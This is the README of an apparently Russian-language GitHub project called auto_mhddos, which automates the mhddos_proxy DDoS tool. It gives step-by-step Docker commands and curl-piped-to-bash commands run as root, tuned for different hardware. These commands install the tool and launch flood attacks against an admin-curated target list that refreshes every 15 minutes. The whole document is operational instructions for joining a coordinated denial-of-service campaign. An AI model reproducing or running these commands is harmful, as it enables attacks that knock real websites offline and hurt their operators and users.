### ⭕️ Оперативный штаб Жнецов
![photo_2022-03-17_23-39-03](https://user-images.githubusercontent.com/41838573/158963538-944690c4-83ea-4934-9a29-6eb8f1e61f3a.jpg)

### Представляем auto_mhddos - автоматизирующий скрипт [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)

1. [Docker](https://github.com/Aruiem234/auto_mhddos#-docker)
2. [Bash](https://github.com/Aruiem234/auto_mhddos#-bash)
3. [Kubernetes](https://github.com/Aruiem234/auto_mhddos/tree/main/helm-charts#mhddos-auto-helm-charts)

## 🪖 Docker

Установить [Docker](https://docs.docker.com/get-docker/) и запустить команду:

```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest [num_of_copies] [threads] [rpc]
```

Все параметры опциональные, но если передаются, то строго в указанном порядке.

### Команды для разного железа: 

-- Слабое (2 ядра 2 ГБ). Эти же параметры использутся по умолчанию, если запускать команду без аргументов.


```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 1 500 100
```

-- Среднее: 


```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 2 1000 200
```

-- Быстрое: 


```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 2 2000 1000
```

Значение параметров на примере "1 500 100":

1 - кол-во паралельно запущенных копий mhddos_proxy.

500 - количество потоков (threads). Параметр -t в mhddos_proxy.

100 - параметр --rpc в mhddos_proxy.

## 🪖 Bash

Перед запуском перейти под пользователя root. Для этого выполнить команду `sudo su`

### 1. Установка.

Выполняется для начальной установки ПО, и периодического обновления. Не обязательно использовать каждый раз.


```shell
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/setup.sh | bash
```

Скрипт автоматически устанавливает git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.

### 2. Запуск.

Bash скрипт работает в Linux и WSL (Windows Subsystem for Linux).

Не забудьте сначала выполнить пункт №1 (Установка). Также не забудьте получить права root `sudo su`.


```shell
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash
```

### Команды для разного железа: 

-- Слабое (2 ядра 2 ГБ). Эти же параметры использутся по умолчанию, если запускать команду без аргументов.


```shell
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 1 500 100
```

-- Среднее: 


```shell
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 1000 200
```

-- Быстрое: 


```shell
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 2000 1000
```

Значение параметров на примере "bash -s -- 1 500 100":

1 - кол-во паралельно запущенных копий mhddos_proxy.

500 - количество потоков (threads). Параметр -t в mhddos_proxy.

100 - параметр --rpc в mhddos_proxy.

# ❕Описание
* Работает с курируемым админами единым списком [сайтов-целей](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).

* База целей обновляется скриптом каждые 15 мин.

* Если целей много, то они выбираются из списка рандомно, поэтому не обязательно раскидывать пользователей по группам и распределять между ними нагрузку. Рандом все сделает самостоятельно.

* По умолчанию скрипт запускает 1 копию mhddos_proxy. Если запустить больше, то каждая копия будет независимо выбирает цель из списка, повторяться они не будут. Для этого в списке должны быть хотя бы две цели. Если будет мало целей, лишние копии программы просто не будут запускаться.

* Чтобы скрипт запускал больше копий mhddos_proxy, например 3, выполнить следующую команду `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/setup.sh | bash | bash -s -- 3` Если в списке всего две цели, то запускать три копии нет смысла. Вреда правда тоже не будет. Скрипт запустит только необходимое кол-во копий.

Теоретически все это позволяет запустить скрипт на ПК/vps и всю остальную работу (обновление, перезапуск) он будет делать самостоятельно.

Рекомендуется использовать на Ubuntu 20.04. Вероятно будет работать на всех Ubuntu начиная с 18.04, а также всех производных Ubuntu и WSL2.

# ❌ Завершение скрипта

CTRL+C срабатывает не всегда. Поэтому можно:

* Просто закрыть окно с терминалом.

ИЛИ

* В другом терминале выполните команду `sudo pkill -f start.py; sudo pkill -f runner.py`, а потом в основном терминале нажмите CTRL + C.

### 🇺🇦🇺🇦🇺🇦 СЛАВА УКРАЇНІ 🇺🇦🇺🇦🇺🇦
### ПТН ХЛО 🤡
